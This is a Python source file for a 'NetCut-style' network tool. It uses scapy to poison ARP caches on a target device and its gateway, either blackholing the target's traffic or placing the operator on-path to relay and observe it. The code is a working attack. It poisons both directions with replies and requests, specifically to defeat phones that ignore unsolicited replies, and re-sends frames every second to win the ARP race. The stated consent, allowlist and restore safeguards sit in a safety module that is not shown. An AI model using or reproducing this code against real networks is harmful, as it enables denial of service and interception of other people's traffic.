"""jammer.py — ARP cut / route-through / restore (Layer-2 only).

This is the "NetCut-style" control, built on the single fact that ARP is
unauthenticated: a device will cache whatever MAC claims to own an IP. We use
that to either blackhole a target's gateway path (``cut``) or sit on-path and
relay it (``route``). Both are fully reversible.

Hard rules (enforced via safety.py, see AGENTS.md):
  * Only acts on consented, allowlisted targets.
  * Every poison is registered so it is restored on exit/crash/STOP.
  * Only ARP. No 802.11 frames, ever.

Packet forwarding for route-through (keeping the target online while we observe)
lives in observer.py — once we are on-path, the observer both relays and reads.
"""
from __future__ import annotations

import asyncio
import logging
from typing import Optional

from scapy.all import ARP, Ether, sendp

from . import net
from .safety import PoisonRecord, SafetyManager

log = logging.getLogger("rootrex.jammer")

REASSERT_INTERVAL = 1.0  # re-send poison this often; faster = wins the ARP race.
RESTORE_BURST = 6        # how many correct ARP frames to send when restoring.
START_BURST = 4          # immediate poison frames on start, so the cut bites at once.


class Jammer:
    def __init__(self, ctx: net.NetContext, safety: SafetyManager) -> None:
        self.ctx = ctx
        self.safety = safety
        self._tasks: dict[str, asyncio.Task] = {}   # target_mac -> reassert task
        # Tell the safety layer how to undo a poison. This is what runs on
        # exit / crash / STOP, so it must be pure ARP and never raise upward.
        self.safety.set_restore_fn(self._restore_record)

    # ------------------------------------------------------------- low level
    def _arp(self, op: int, dst_mac: str, psrc: str, hwsrc: str,
             pdst: str, hwdst: str) -> None:
        sendp(Ether(dst=dst_mac) / ARP(op=op, psrc=psrc, hwsrc=hwsrc,
                                       pdst=pdst, hwdst=hwdst),
              iface=self.ctx.iface, verbose=0)

    def _poison_once(self, rec: PoisonRecord) -> None:
        """Poison BOTH directions, each as a reply (op=2) AND a request (op=1).

        Many phones ignore unsolicited ARP replies but will update their cache
        from an ARP request whose sender IP they already know — so we send both.
        Poisoning the gateway too means the return path is ours as well, which
        makes a cut actually bite and lets route-through see both directions."""
        me = self.ctx.local_mac
        # target believes the gateway is at us
        self._arp(2, rec.target_mac, rec.gateway_ip, me, rec.target_ip, rec.target_mac)
        self._arp(1, rec.target_mac, rec.gateway_ip, me, rec.target_ip, rec.target_mac)
        # gateway believes the target is at us
        self._arp(2, rec.gateway_mac, rec.target_ip, me, rec.gateway_ip, rec.gateway_mac)
        self._arp(1, rec.gateway_mac, rec.target_ip, me, rec.gateway_ip, rec.gateway_mac)

    def _restore_record(self, rec: PoisonRecord) -> None:
        """Put the correct ARP truth back. Registered with SafetyManager."""
        for _ in range(RESTORE_BURST):
            self._arp(2, rec.target_mac, rec.gateway_ip, rec.gateway_mac,
                      rec.target_ip, rec.target_mac)
            self._arp(2, rec.gateway_mac, rec.target_ip, rec.target_mac,
                      rec.gateway_ip, rec.gateway_mac)

    # --------------------------------------------------------------- reassert
    async def _reassert_loop(self, rec: PoisonRecord) -> None:
        try:
            while True:
                self._poison_once(rec)
                self.safety.heartbeat()
                await asyncio.sleep(REASSERT_INTERVAL)
        except asyncio.CancelledError:
            raise

    # ----------------------------------------------------------------- public
    def _build_record(self, target_ip: str, target_mac: str, mode: str) -> PoisonRecord:
        if self.ctx.gateway_mac is None:
            raise RuntimeError("Gateway MAC unknown — run a scan / discovery first.")
        if target_mac.lower() == (self.ctx.local_mac or "").lower() or target_ip == self.ctx.local_ip:
            raise RuntimeError("Refusing to target this host (self).")
        return PoisonRecord(
            target_ip=target_ip, target_mac=target_mac.lower(),
            gateway_ip=self.ctx.gateway_ip, gateway_mac=self.ctx.gateway_mac,
            mode=mode,
        )

    async def _start(self, target_ip: str, target_mac: str, mode: str) -> None:
        target_mac = target_mac.lower()
        await self.stop(target_mac)  # clear any existing state first
        rec = self._build_record(target_ip, target_mac, mode)
        # safety validates consent + allowlist and registers for restore.
        self.safety.register_poison(rec)
        try:
            for _ in range(START_BURST):   # hit hard immediately so it bites at once
                self._poison_once(rec)
        except Exception:
            # If the very first send fails (e.g. no packet layer), don't leave a
            # dangling poison record the UI would show as active.
            self.safety.clear_poison(target_mac, reason="jammer.start_failed")
            raise
        self._tasks[target_mac] = asyncio.create_task(self._reassert_loop(rec))
        log.info("jammer %s started on %s", mode, target_ip)

    async def cut(self, target_ip: str, target_mac: str) -> None:
        """Blackhole: target believes we are the gateway, and we do not forward."""
        await self._start(target_ip, target_mac, mode="cut")

    async def route(self, target_ip: str, target_mac: str) -> None:
        """On-path: poison both directions. observer.forward() keeps it online."""
        await self._start(target_ip, target_mac, mode="route")

    async def stop(self, target_mac: str) -> None:
        """Stop jamming one target and restore its ARP truth."""
        target_mac = target_mac.lower()
        task = self._tasks.pop(target_mac, None)
        if task is not None:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        self.safety.clear_poison(target_mac, reason="jammer.stop")

    async def stop_all(self) -> None:
        for mac in list(self._tasks):
            await self.stop(mac)
        self.safety.restore_all(reason="jammer.stop_all")

    @property
    def active(self) -> dict[str, str]:
        """target_mac -> mode for everything currently jammed."""
        return {rec.target_mac: rec.mode for rec in self.safety.active_poisons}
